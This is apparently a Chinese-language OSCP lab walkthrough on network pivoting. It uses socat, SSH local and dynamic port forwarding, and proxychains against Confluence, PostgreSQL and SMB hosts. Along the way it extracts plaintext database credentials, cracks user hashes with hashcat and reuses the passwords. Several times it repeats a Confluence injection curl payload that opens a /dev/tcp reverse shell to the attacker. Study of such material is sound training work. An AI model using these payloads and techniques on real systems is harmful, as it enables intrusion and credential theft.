<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.228.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```
> 顯示明文資料庫憑證：
> - PostgreSQL 資料庫 `10.4.228.215:5432`
> - Username：`postgres`
> - Password：`D@t4basePassw0rd!`

>[!Note]
> 直接連線遇到問題：\
> CONFLUENCE01 沒有 PostgreSQL 客戶端 (psql)，所以無法直接存取資料庫。
我們的 Kali 也無法直接連線，因為 PGDATABASE01 只允許內部網段存取

>[!Important]
>解決方法：**使用 Port Forwarding 透過 CONFLUENCE01 存取資料庫**\
> 在 CONFLUENCE01 上建立一個 port forwarding，監聽 WAN 介面上的一個端口，然後將該連接埠上收到的所有資料包轉發到內部子網路上的 PGDATABASE01。將使用 [Socat](http://www.dest-unreach.org/socat/doc/socat.html) 來完成。

### Port Forwarding with Socat
- `PGDATABASE01（10.4.228.215:5432）`: 只能從內部 DMZ 存取。
- `Kali（192.168.45.182）`: 無法直接連線。

讓 CONFLUENCE01 監聽 WAN（192.168.228.63）上的某個 Port，並轉發流量到內部 PostgreSQL。這樣 Kali 就能透過 CONFLUENCE01 存取資料庫！
![image](https://hackmd.io/_uploads/HktbqW7o1g.png)

在 CONFLUENCE01 的 WAN 介面上開啟 TCP 連接埠 2345，然後從我們的 Kali 機器連接到該 port。將發送到該連接埠的所有封包都由 CONFLUENCE01 轉送到 PGDATABASE01 上的 TCP port 5432。一旦我們設定了連接埠轉發，連接到 CONFLUENCE01 上的 TCP port 2345 將與直接連接到 PGDATABASE01 上的 TCP port 5432 完全一樣。

>[!Tip]
> 若發現環境中沒有安裝 Socat，可以下載 binary version

#### 1. Socat process (for DB)
將啟動一個詳細的（-ddd）Socat process。
1. 將監聽 TCP 連接埠 2345 ( TCP-LISTEN:2345 )，
2. 在收到連線時分叉成一個新的子程序 ( fork )，而不是在收到一個連線後就終止
3. 然後將收到的所有流量轉送到 PGDATABASE01 上的 TCP 連接埠 5432 (TCP:10.4.228.215:5432)

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432   
<cat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432   
2025/03/03 11:02:36 socat[4442] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2025/03/03 11:02:36 socat[4442] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2025/03/03 11:02:36 socat[4442] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2025/03/03 11:02:36 socat[4442] I setting option "fork" to 1
2025/03/03 11:02:36 socat[4442] I socket(2, 1, 6) -> 5
2025/03/03 11:02:36 socat[4442] I starting accept loop
2025/03/03 11:02:36 socat[4442] N listening on AF=2 0.0.0.0:2345
```
> `TCP-LISTEN:2345,fork`: 讓 socat 監聽本機 2345 port\
> `fork`: 當有新連線時，socat 會 fork 一個新的 process 來處理該連線，而主 process 繼續監聽 2345\
> `TCP:10.4.228.215:5432`: 將流量轉發到 10.4.228.215:5432

![image](https://hackmd.io/_uploads/BJdzTZmskx.png)

####  2. psql
在 Kali 上使用 psql 登入 PGDATABASE01
```
┌──(chw㉿CHW)-[~]
└─$ psql -h 192.168.228.63 -p 2345 -U postgres        
Password for user postgres: 
psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```
> 成功登入 PostgreSQL database
> > 可以存取 `confluence database`

繼續 enumeration\
在 [confluence database](https://jira.atlassian.com/browse/CONFSERVER-41321) 查詢 cwd_user table，這會包含所有 username 和 password hash
```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

#### 3. hashcat 爆破
根據 [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) 查詢，Atlassian (PBKDF2-HMAC-SHA1) hashes 是 12001
```
┌──(chw㉿CHW)-[~]
└─$ cat hashes.txt 
{PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
{PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
{PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
                                                                                                
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 6 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...
{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```
> 成功破解其中三位使用者密碼，分別是 `database_admin`, `hr_admin` 與 `rdp_admin`

需要懷疑這些密碼可能在其他地方被重複使用\
可以發現 PGDATABASE01 也有啟用 SSH server
#### 4. Socat process (for SSH)
利用 socat 建立供 ssh 使用的 port forwarding，**需要先終止原本的 Socat process**
```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```
![image](https://hackmd.io/_uploads/BJLzIMmjkx.png)

```
kali@kali:~$ ssh database_admin@192.168.228.63 -p2222
The authenticity of host '[192.168.228.63]:2222 ([192.168.228.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.228.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.228.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

...
database_admin@pgdatabase01:~$
```
> 成功登入 database_admin

>[!Important]
>除了 socat 之外，還有其他方式可以在 UNIX / Linux 系統上建立 Port Forwarding:
>- rinetd（Redirection Internet Daemon:\
適合 longer-term port forwarding ，以 daemon 運行。
>- netcat + FIFO
>可以透過 netcat 和 FIFO 文件來建立端口轉發，這種方法適合簡單或一次性的轉發需求。
>- iptables（需 root 權限）
>需要額外啟用 Linux 封包轉發功能: `echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding`

## SSH Tunneling
[Tunneling protocol](https://en.wikipedia.org/wiki/Tunneling_protocol): 將一種 data stream 封裝在另一種 data stream 中，並透過網路傳輸。[SSH](https://en.wikipedia.org/wiki/Secure_Shell)（Secure Shell）也是其中一種 protocol。\
在 SSH 之前（未加密）： `rsh`、`rlogin`、`Telnet`\
在官方文件中，SSH Tunneling 通常被稱為 SSH Port Forwarding
### SSH Local Port Forwarding
[SSH local port forwarding](https://man.openbsd.org/ssh#L) 與上述 socat port forwarding 不同之處，是在兩個 hosts（ SSH client與 SSH server）之間建立 SSH connection，所有流量都從 Tunnel 通過。\
- 場景修改：
    - CONFLUENCE01 不再支援 socat
    - 我們仍然擁有 database_admin credentials，可 SSH 進入 PGDATABASE01。
    - 在 PGDATABASE01 內部網段，發現一台新的 SMB 伺服器（TCP 445）
    - 目標：我們希望從 Kali 下載 SMB 伺服器上的檔案。

- 解法：
    - 透過 SSH Local Port Forwarding 來建立隧道：
    - 讓 CONFLUENCE01 監聽 TCP 4455。
    - 所有發送到 4455 的流量會透過 SSH 隧道傳送到 PGDATABASE01。
    - PGDATABASE01 會進一步將流量轉發到內部 SMB 伺服器（TCP 445）。
    ![image](https://hackmd.io/_uploads/ryfDVN7o1l.png)
#### 1. Python 3's pty module with TTY functionality
重新注入 reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.147.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5678%200%3E%261%27%29.start%28%29%22%29%7D/
```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 5678
listening on [any] 5678 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.147.63] 47734
bash: cannot set terminal process group (2111): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```
在 SSH connection 之前，先做 enumeration，確保 shell 中， Python 3 的 pty module 具有 [TTY](https://en.wikipedia.org/wiki/TTY) functionality。
>[!Warning]
>If we have problems with `/bin/bash` we can switch to `/bin/sh`.\
>`/bin/bash` 與 `/bin/sh` 差異可參考 [Part 1 Local File Inclusion (LFI) (4)](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md#4-get-a-reverse-shell-or-add-our-ssh-key-to-the-authorized_keys-file-for-a-user)

CONFLUENCE01 建立了到 PGDATABASE01 的 SSH connection
```
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh database_admin@10.4.147.215
ssh database_admin@10.4.147.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.147.215 (10.4.147.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.147.215's password: sqlpass123

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 03 Mar 2025 02:08:53 PM UTC

  System load:  0.02              Processes:               233
  Usage of /:   80.5% of 6.79GB   Users logged in:         0
  Memory usage: 15%               IPv4 address for ens192: 10.4.147.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.147.254


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$ 
```
#### 2. 在 target machine 查看 network interface
開始在 PGDATABASE01 枚舉 network interface
```
database_admin@pgdatabase01:~$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:92:f0 brd ff:ff:ff:ff:ff:ff
    inet 10.4.147.215/24 brd 10.4.147.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:db:8a brd ff:ff:ff:ff:ff:ff
    inet 172.16.147.254/24 brd 172.16.147.255 scope global ens224
       valid_lft forever preferred_lft forever
database_admin@pgdatabase01:~$ ip route
ip route
default via 10.4.147.254 dev ens192 proto static 
10.4.147.0/24 dev ens192 proto kernel scope link src 10.4.147.215 
172.16.147.0/24 dev ens224 proto kernel scope link src 172.16.147.254 
```
> 發現 PGDATABASE01 能夠連線到另一個 subnet `172.16.147.0/24`

#### 2. 在 target machine 枚舉
開始搜尋 subnet，但環境中沒有安裝 reconnaissance tool\
所以使用 Bash for loop 檢查有開放 445 port 的主機
```
database_admin@pgdatabase01:~$ nmap
nmap

Command 'nmap' not found, but can be installed with:

snap install nmap  # version 7.93, or
apt  install nmap  # version 7.80+dfsg1-2build1

See 'snap info nmap' for additional versions.

database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.147.$i 445; done
<(seq 1 254); do nc -zv -w 1 172.16.147.$i 445; done
nc: connect to 172.16.147.1 port 445 (tcp) timed out: Operation now in progress
nc: connect to 172.16.147.2 port 445 (tcp) timed out: Operation now in progress
nc: connect to 172.16.147.3 port 445 (tcp) timed out: Operation now in progress
...
Connection to 172.16.147.217 445 port [tcp/microsoft-ds] succeeded!
nc: connect to 172.16.147.218 port 445 (tcp) timed out: Operation now in progress
nc: connect to 172.16.147.219 port 445 (tcp) timed out: Operation now in progress
...
```
> `for i in $(seq 1 254); do ... done`: 產生迴圈 (172.16.147.1 到 172.16.147.254)\
> `nc -zv -w 1 172.16.147.$i 445`:
> - `-z（Zero-I/O mode）`：只檢查端口是否開啟，不傳送資料
> - `-v（Verbose）`： 詳細顯示
> - `-w 1（Timeout 1 秒）`：設置 1 秒超時，防止掃描過慢
> > 找到 SMB ip: `172.16.147.217:445`

#### 3. Download SMB Server file
##### 3.1 [方法 1] 使用內建工具傳回 CONFLUENCE01
內建工具： smbclient, smbget, mount.cifs, rpcclient 等等
##### 3.2 [方法 2] SSH local port forwarding
可以建立 SSH local port forwarding。將監聽 CONFLUENCE01 的 WAN interface 的 4455 port，並透過 SSH Tunnel 將封包從 PGDATABASE01 轉送出去並直接轉送到我們找到的 SMB 共用。然後我們可以直接從 Kali 機器連接到 CONFLUENCE01 上的監聽 port。

斷開 SSH，回到 CONFLUENCE01 建立 SSH local port forwarding：
```
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh -N -L 0.0.0.0:4455:172.16.147.217:445 database_admin@10.4.147.215
ssh -N -L 0.0.0.0:4455:172.16.147.217:445 database_admin@10.4.147.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.147.215 (10.4.147.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.147.215's password: sqlpass123

```
>`-N`：不執行命令，只建立 SSH Tunnel\
>`-L 0.0.0.0:4455:172.16.147.217:445`: local port 0.0.0.0:4455 → 轉發到 172.16.50.147:445（透過 PGDATABASE01 轉到 SMB Server)，`0.0.0.0` 讓為了讓 Kali 能直接存取這個 port。
>> SSH local port forwarding 已成功打通

#### 4. 驗證 SSH local port forwarding
再注入一個 reverse shell 驗證 port forwarding 是不是成功
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.147.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/8888%200%3E%261%27%29.start%28%29%22%29%7D/
```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.147.63] 58090
bash: cannot set terminal process group (2111): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu
ss -ntplu
Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
udp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*                                                                                     
tcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*                                                                                     
tcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*                                                                                     
tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=4281,fd=4))                                                  
tcp    LISTEN  0       128                     [::]:22               [::]:*                                                                                     
tcp    LISTEN  0       10                         *:8090                *:*      users:(("java",pid=2160,fd=44))                                                
tcp    LISTEN  0       1024                       *:8091                *:*      users:(("java",pid=2582,fd=21))                                                
tcp    LISTEN  0       1         [::ffff:127.0.0.1]:8000                *:*      users:(("java",pid=2160,fd=77))                                             
```
> `ss`：類似於 netstat，但速度更快，用於顯示網路連線資訊。\
`-n`：不解析 DNS\
`-t`：顯示 TCP 連線
`-p`：顯示與連線相關的 process 名稱\
`-l`：顯示正在 監聽 (LISTEN) 的 port\
`-u`：顯示 UDP 連線。
>>`tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=4281,fd=4))`: 成功利用 4455 port 打通 SSH forwarding (到 SMB Server: 172.16.147.217:445)

![image](https://hackmd.io/_uploads/Hky-MS7s1g.png)

#### 5. 利用 smbclient 共享檔案
透過剛剛打通的 4455 port 連接 SMB Server
```
┌──(chw㉿CHW)-[~]
└─$ smbclient -p 4455 -L //192.168.147.63/ -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.147.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```
>`-L`: 只列出共享資源，代表能夠成功存取

```
┌──(chw㉿CHW)-[~]
└─$ smbclient -p 4455 //192.168.147.63/scripts -U hr_admin --password=Welcome1234
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 13 04:37:59 2022
  ..                                 DR        0  Tue Sep  6 11:02:37 2022
  Provisioning.ps1                   AR     1806  Mon Mar  3 08:45:25 2025

                5319935 blocks of size 4096. 337010 blocks available
smb: \> get Provisioning.ps1
getting file \Provisioning.ps1 of size 1806 as Provisioning.ps1 (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
smb: \>
```
> `//192.168.147.63/scripts`: 指定要連接 192.168.147.63 這台機器上的 scripts 共享資料夾

![image](https://hackmd.io/_uploads/Hy07EHmiyx.png)
> 也可以查看其他資料夾

>[!Important]
>整個 SSH Local Port Forwarding 架構：
>`Kali → CONFLUENCE01:4455 → (SSH 隧道) → PGDATABASE01 → 172.16.147.217:445 (SMB)`

### SSH Dynamic Port Forwarding
>[!Caution]
> Local port forwarding 有一個限制:\
> Only connect to **one** socket per SSH connection

OpenSSH 提供了 [dynamic port forwarding](https://man.openbsd.org/ssh#D)，可以讓一個 SSH 連線同時轉發多個不同的連線
SSH Local Port Forwarding (`-L`)，而 SSH Dynamic port forwarding (`-D`) 則是透過建立 SOCKS proxy server port，允許任何應用程式發送請求，並透過 SSH 連線進行轉發，使我們能夠存取 SSH 伺服器能夠路由的任何目標。
![image](https://hackmd.io/_uploads/SJ_S8rmskx.png)

現在架構在監聽 WAN 上的 TCP port 9999\
目標： 以 SOCKS proxy 的 dynamic port forwarding 方式建立 SSH Tunnel

#### 1. 建立交互式的 TTY shell
一樣先注入 reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.147.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/8888%200%3E%261%27%29.start%28%29%22%29%7D/
```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.147.63] 37096
bash: cannot set terminal process group (2117): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.147.254 dev ens192 proto static 
10.4.147.0/24 dev ens224 proto kernel scope link src 10.4.147.63 
192.168.147.0/24 dev ens192 proto kernel scope link src 192.168.147.63 
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ 
```
#### 2. 建立 OpenSSH dynamic port forward
```
$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.147.215
ssh -N -D 0.0.0.0:9999 database_admin@10.4.147.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.147.215 (10.4.147.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.147.215's password: sqlpass123

```
>[!Tip]
> 一樣可以再使用另一個 reverse shell，執行 `ss -ntplu` 確認連線狀況

>[!Note]
>比較 Local Port Forwarding 與 Dynamic Port Forwarding\
>![image](https://hackmd.io/_uploads/HkuxFSmjJe.png)

#### 3. 設定 Proxychains
連線與上章節相同 HRSHARES 445 port
但 smbclient 沒有 [SOCKS proxy](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)，如果 smbclient 中沒有使用 SOCKS proxy 就無法利用 dynamic port forward，所以我們需要利用 [Proxychains](https://github.com/rofl0r/proxychains-ng)。\
Proxychains 是一種可以強制第三方工具透過 HTTP 或 SOCKS proxy 傳輸網路流量的工具。

>[!Note]
> Proxychains 的運作原理，主要是透過 Linux 的共享函式庫預載技術`LD_PRELOAD` 來攔截應用程式的網路請求，並強制讓流量通過事先設定的代理伺服器（SOCKS 或 HTTP Proxy)\
> > Proxychains 透過 `LD_PRELOAD`，攔截應用程式對 libc（標準 C 函式庫）內的網路函式呼叫，例如 connect()、send()、recv()，並將流量強制轉發到 SOCKS 或 HTTP 代理伺服器。

Proxychains 透過 configuration file 設定： `/etc/proxychains4.conf`\
編輯此文件以確保 Proxychains 可以找到 SOCKS proxy port。
```
┌──(chw㉿CHW)-[~]
└─$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 192.168.147.63 9999
```
>[!Tip]
>雖然設定 socks5，但它也可以是 socks4，因為 SSH 兩者都支援。\
>SOCKS5 支援 authentication, IPv6, and User Datagram Protocol (UDP) 包含 DNS。\
>有些 SOCKS proxies 只支援 socks4，須先檢查 SOCKS 伺服器支援哪個版本

#### 4. smbclient 連接 SMB Server
```
┌──(chw㉿CHW)-[~]
└─$ proxychains smbclient -L //172.16.147.217/ -U hr_admin --password=Welcome1234
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.147.63:9999  ...  172.16.147.217:445  ...  OK

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
